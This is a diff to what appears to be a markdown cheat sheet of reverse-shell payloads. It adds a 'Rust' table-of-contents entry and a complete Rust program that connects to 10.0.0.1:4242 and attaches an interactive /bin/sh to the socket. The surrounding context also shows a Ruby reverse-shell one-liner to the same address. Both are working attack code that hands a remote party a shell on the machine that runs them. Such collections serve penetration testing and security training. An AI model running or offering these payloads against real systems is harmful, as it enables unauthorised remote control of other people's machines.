@@ -28,6 +28,7 @@
     * [Powershell](#powershell)
     * [Python](#python)
     * [Ruby](#ruby)
+    * [Rust](#rust)
     * [Socat](#socat)
     * [Telnet](#telnet)
     * [War](#war)
@@ -197,6 +198,27 @@ NOTE: Windows only
 ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
+### Rust
+
+```rust
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+fn main() {
+    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
+    let fd = s.as_raw_fd();
+    Command::new("/bin/sh")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+}
+```
 ### Golang
 
 ```bash
